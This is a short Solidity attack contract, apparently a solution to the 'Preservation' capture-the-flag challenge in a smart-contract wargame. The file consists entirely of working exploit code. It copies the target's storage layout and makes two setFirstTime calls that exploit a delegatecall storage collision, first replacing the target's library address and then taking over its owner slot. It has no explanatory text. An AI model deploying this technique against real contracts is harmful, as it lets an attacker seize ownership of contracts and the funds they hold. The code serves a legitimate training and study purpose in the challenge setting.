// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    IPreservation public challenge;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
    }

    function attack() external {
        challenge.setFirstTime(uint160(address(this)));
        challenge.setFirstTime(uint160(msg.sender));
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }
}
